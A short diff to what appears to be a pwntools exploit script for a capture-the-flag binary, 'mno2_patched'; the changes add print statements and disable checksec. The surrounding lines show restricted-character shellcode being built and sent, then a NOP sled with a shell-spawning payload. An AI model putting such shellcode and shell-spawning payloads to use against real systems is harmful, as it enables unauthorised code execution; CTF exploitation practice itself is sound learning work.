@@ -27,7 +27,7 @@ leak_dec = lambda r, offset=0: int(r, 10) - offset
 A = lambda len=1, c=b'A': c * len
 z = lambda len=1, c=b'\0': c * len
 
-exe = ELF("mno2_patched")
+exe = ELF("mno2_patched", checksec=False)
 
 context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
 context.binary = exe
@@ -126,6 +126,7 @@ filtered = {
 | k    | 0x6B      | imul reg, r/m, imm8                                                      |
 '''
 
+print("Reading more shellcode")
 shellcode = b""
 shellcode += b"I" * 11
 shellcode += b"1He"
@@ -144,6 +145,7 @@ shellcode += b'89'
 sl(p, shellcode)
 
 sleep(1)
+print("Spawn shell")
 
 s(p, b'\x90' * 0x67 + asm(shellcraft.sh()))
 
